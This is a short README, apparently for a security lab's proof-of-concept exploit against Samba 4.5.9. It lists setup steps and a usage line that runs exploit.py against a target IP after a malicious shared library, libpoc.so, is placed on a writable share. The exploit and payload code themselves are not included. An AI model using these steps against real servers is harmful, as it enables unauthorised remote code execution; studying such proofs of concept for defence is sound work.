# Basic Setup

## Install Samba version 4.5.9
* https://download.samba.org/pub/samba/stable/samba-4.5.9.tar.gz
* https://wiki.samba.org/index.php/Build_Samba_from_Source

## Get patched version of Impacket
`pip install -r requirements.txt`


# Usage
1. Start Samba server in interactive mode + debug print

`sudo /home/ubuntu/samba-4.5.9/bin/smbd -i --debuglevel=10 --configfile=/etc/samba/smb.conf`

2. Copy **[libpoc.so](payload/bin/libpoc.so)** to target share
3. HAVE FUN!

`exploit.py -t x.x.x.x -m /path/to/libpoc.so`

# Notes
* liked this project? visit us at http://www.intezer.com | @IntezerLabs(twitter)

![Screenshot](screenshot.png)
